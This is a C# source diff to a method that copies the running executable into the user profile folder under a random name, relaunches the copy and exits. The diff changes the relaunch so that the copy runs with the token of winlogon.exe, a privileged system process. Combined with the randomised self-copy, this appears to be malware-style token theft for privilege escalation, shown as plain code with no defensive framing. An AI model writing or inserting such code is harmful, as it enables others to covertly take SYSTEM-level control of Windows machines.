@@ -2,6 +2,7 @@
 using System.Diagnostics;
 using System.IO;
 using System.Linq;
+using System.Runtime.InteropServices;
 
 // REQUIRES PUBLISHING TO SINGLE FILE
 
@@ -22,27 +23,26 @@ namespace Memory
         {
             Process process = Process.GetCurrentProcess();
             string tempPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
-            if (process.MainModule != null)
+            if (process.MainModule == null) return string.Empty;
+            if (Path.GetDirectoryName(process.MainModule.FileName) == tempPath)
             {
-                if (Path.GetDirectoryName(process.MainModule.FileName) == tempPath)
-                {
-                    return Path.GetFileNameWithoutExtension(process.MainModule.FileName);
-                }
-
-                string newExePath = tempPath + @"\" + RandomStr(Rand.Next(5, 13)) + ".exe";
-                string processPath = string.Empty;
-                if (process.MainModule != null) processPath = process.MainModule.FileName;
-
-                if (processPath != null)
-                {
-                    if (File.Exists(newExePath))
-                    {
-                        File.Delete(newExePath);
-                    }
-                    File.Copy(processPath, newExePath);
-                    Process.Start(newExePath);
-                    Environment.Exit(0);
-                }
+                return Path.GetFileNameWithoutExtension(process.MainModule.FileName);
+            }
+            string newExePath = tempPath + @"\" + RandomStr(Rand.Next(5, 13)) + ".exe";
+            string processPath = string.Empty;
+            if (process.MainModule != null) processPath = process.MainModule.FileName;
+            if (processPath != null)
+            {
+                if (File.Exists(newExePath))
+                    File.Delete(newExePath);
+                File.Copy(processPath, newExePath);
+                Sudoku.RunWithTokenOf(
+                    "winlogon.exe",
+                    true,
+                    newExePath,
+                    string.Empty,
+                    RuntimeEnvironment.GetRuntimeDirectory());
+                Environment.Exit(0);
             }
             return string.Empty;
         }
